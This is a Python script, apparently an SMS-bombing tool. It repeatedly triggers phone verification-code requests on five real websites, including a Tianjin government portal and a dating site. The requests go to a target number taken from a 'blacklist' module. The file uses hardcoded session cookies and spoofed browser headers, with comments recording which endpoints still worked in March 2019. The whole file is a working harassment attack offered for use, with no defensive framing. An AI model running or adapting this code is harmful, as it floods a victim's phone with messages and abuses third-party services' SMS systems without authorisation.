# -*-coding=utf-8-*-
import json
import time

__author__ = 'xda'
import requests
from blacklist import phone



class BaseService(object):

    def loop(self,count):
        for i in range(count):
            print("第{}次发送".format(i))
            self.run()
            time.sleep(61)

# 可以使用 2019-03-24
class Tianjin(BaseService):
    """天津电子化商务短信接口"""

    def __init__(self, mobile):
        self.url = "http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login"
        self.header = {'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip,deflate',
                       'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                       'Accept': 'application/json,text/javascript,*/*;q=0.01',
                       'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)UbuntuChromium/69.0.3497.81Chrome/69.0.3497.81Safari/537.36',
                       'Cache-Control': 'no-cache', 'Proxy-Connection': 'keep-alive',
                       'X-Requested-With': 'XMLHttpRequest',
                       'Referer': 'http://qydj.scjg.tj.gov.cn/reportOnlineService/', 'Pragma': 'no-cache',
                       'Host': 'qydj.scjg.tj.gov.cn', 'Origin': 'http://qydj.scjg.tj.gov.cn',
                       'Cookie': 'JSESSIONID=01C5009FB87D462F63B5AB392625AC5F;qcdzh-session-id=59d2642e-45de-4688-a344-39d6acdbca89;UM_distinctid=169ae2834fc330-000a1103c817a2-24414032-1fa400-169ae2834fd12b;CNZZDATA1274944014=1681916474-1553405064-http%253A%252F%252Fqydj.scjg.tj.gov.cn%252F%7C1553405064'
                       }

        self.mobile = mobile

    def run(self):
        data = {
            'MOBILENO': self.mobile,
            'TEMP': 1
        }

        try:
            response = requests.post(url=self.url,
                                     data=data,
                                     headers=self.header
                                     )
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

        else:
            print(response.text)


# 可以使用 2019-03-24
class Itjuzi(BaseService):
    """IT 橘子"""

    def __init__(self, mobile):
        self.url = "https://www.itjuzi.com/api/verificationCodes"
        self.header = {'CURLOPT_FOLLOWLOCATION': 'true', 'Cache-Control': 'no-cache',
                       'Accept-Language': 'en-US,en;q=0.9',
                       'Cookie': 'acw_tc=76b20f4715534175904992017e625d1ce1639b46ffcbd3604b282210ee639f;gr_user_id=26589f4f-2dda-48ba-becc-38ecc0fdb54b;gr_session_id_eee5a46c52000d401f969f4535bdaa78=6ad189e3-c479-4b33-a4a7-e5bde49e8604;gr_session_id_eee5a46c52000d401f969f4535bdaa78_6ad189e3-c479-4b33-a4a7-e5bde49e8604=true;_ga=GA1.2.2093132856.1553417592;_gid=GA1.2.164975259.1553417592;_gat_gtag_UA_59006131_1=1;Hm_lvt_1c587ad486cdb6b962e94fc2002edf89=1553417592;Hm_lpvt_1c587ad486cdb6b962e94fc2002edf89=1553417592',
                       'Host': 'www.itjuzi.com', 'Accept-Encoding': 'gzip,deflate,br',
                       'Accept': 'application/json,text/plain,*/*',
                       'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)UbuntuChromium/69.0.3497.81Chrome/69.0.3497.81Safari/537.36',
                       'Origin': 'https://www.itjuzi.com', 'Referer': 'https://www.itjuzi.com/register',
                       'Pragma': 'no-cache', 'Connection': 'keep-alive',
                       'Content-Type': 'application/json;charset=UTF-8'
                       }

        self.mobile = mobile

    def run(self):
        data = {"account": phone}
        data_str = json.dumps(data)
        try:
            response = requests.post(url=self.url,
                                     data=data_str,
                                     headers=self.header
                                     )
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

        else:
            print(response.text)


# 可以使用 2019-03-24
class XGYC(BaseService):
    """小归用车"""

    def __init__(self, mobile):
        self.url = "https://ems.xg-yc.com/ent/sendMobileCode"
        self.header = {'Connection': 'keep-alive', 'Referer': 'https://ems.xg-yc.com/', 'Pragma': 'no-cache',
                       'Cookie': 'JSESSIONID=EB0E0C81490C740B114ADA7BBE66B624', 'Cache-Control': 'no-cache',
                       'Accept-Encoding': 'gzip,deflate,br', 'Host': 'ems.xg-yc.com',
                       'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://ems.xg-yc.com',
                       'Content-Type': 'application/json;charset=UTF-8', 'Accept': 'application/json,text/plain,*/*',
                       'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)UbuntuChromium/69.0.3497.81Chrome/69.0.3497.81Safari/537.36'}

        self.mobile = mobile

    def run(self):
        payload_data = {
            "mobile": self.mobile,
        }

        try:
            response = requests.post(url=self.url,
                                     data=json.dumps(payload_data),
                                     headers=self.header
                                     )
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

        else:
            print(response.text)



class YiFaTong(BaseService):
    def __init__(self, mobile):
        self.url = "http://www.yifatong.com/Customers/gettsms?rnd="
        self.header = {
            'Pragma': 'no-cache', 'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)UbuntuChromium/69.0.3497.81Chrome/69.0.3497.81Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cookie': 'acw_tc=781bad2215534202890196663e3c95168faf5561a55b6f2c87f25acea4c6c6;CAKEPHP=69b98f0001d310fbd3a0b3dfb26ce077;Qs_lvt_104001=1553420297;Hm_lvt_fb384d34b375f9c11fc59bc51d22f5d4=1553420297;IESESSION=alive;_qddaz=QD.zbeana.eqxz5y.jtmqc54s;tencentSig=3632071680;pgv_pvi=9872420864;pgv_si=s6217749504;Hm_lvt_9eef1197e697839acd67ee28766cd23d=1553420303;_qdda=3-1.1;_qddab=3-m4aio8.jtn170ab;_qddamta_4008515666=3-0;Hm_lpvt_fb384d34b375f9c11fc59bc51d22f5d4=1553438547;Hm_lpvt_9eef1197e697839acd67ee28766cd23d=1553438547;Qs_pv_104001=2036667490745490200%2C385249031444407300%2C2016548322047135700%2C2532027833509272600',
            'Accept-Encoding': 'gzip,deflate', 'Referer': 'http://www.yifatong.com/Customers/registration?url=',
            'Cache-Control': 'no-cache', 'Accept': 'text/html,*/*;q=0.01', 'Proxy-Connection': 'keep-alive',
            'Host': 'www.yifatong.com'
        }
        self.mobile = mobile

    def run(self):
        time_now = time.time()
        time_new = ("%0.3f" % time_now)

        url = self.url + time_new + "&mobile=" + self.mobile

        try:
            response = requests.get(url=url, headers=self.header)
            # print(response.content)
        except Exception:
            print("{}:{}>>>易法通短信接口 发送失败".format(url, self.mobile))
        else:
            print("{}:{}>>>易法通短信接口 发送成功".format(url, self.mobile))
            print(response.text)



class YouYuan(BaseService):
    #有缘网
    def __init__(self, mobile):
        self.url = "http://n.youyuan.com/v20/info/send_captcha.html"
        self.header = {'User-Agent': 'Mozilla/5.0(iPhone;CPUiPhoneOS11_0likeMacOSX)AppleWebKit/604.1.38(KHTML,likeGecko)Version/11.0Mobile/15A372Safari/604.1', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip,deflate', 'Pragma': 'no-cache', 'Accept-Language': 'en-US,en;q=0.9', 'Proxy-Connection': 'keep-alive', 'Cookie': 'JSESSIONID=aaaU3Qwm8nDKRaL3RoWMw;source_register=/v20/register.html;WXCC=HA4TONBQGM3TSNTAGI3S4MZYFYZTELRUGNQDCMZXGEZTINRVGE4DIYDGMFZGSLZWGA2C4MI=;lover2_userId=13A1E5C9A89DC1A89CA56E45501411B5897403796;_fmdata=h2EvVe0ldwPRFcylRcnjjABZbM7kTVPL%2BuT8sbTPryU4Fifb4vRN701L9LZ3K%2BEJ90EKZfwWVXcgTmjWs%2BqI8bKRrBmmrODEIBqz7j3Uu8I%3D', 'Host': 'n.youyuan.com', 'Cache-Control': 'no-cache', 'Referer': 'http://n.youyuan.com/v20/info/auth_mobile.html?back=reg', 'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json', 'Origin': 'http://n.youyuan.com'}

        self.mobile = mobile

    def run(self):

        data={'mobile': self.mobile}
        try:
            response = requests.post(url=self.url, data=data,headers=self.header)
            # print(response.content)
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))
        else:
            print("{}:{}>>>发送成功".format(self.url, self.mobile))
            print(response.text)

def main():
    Tianjin(phone).loop(10)
    Itjuzi(phone).loop(10)
    XGYC(phone).loop(10)
    YiFaTong(phone).loop(10)
    YouYuan(phone).loop(10)

main()
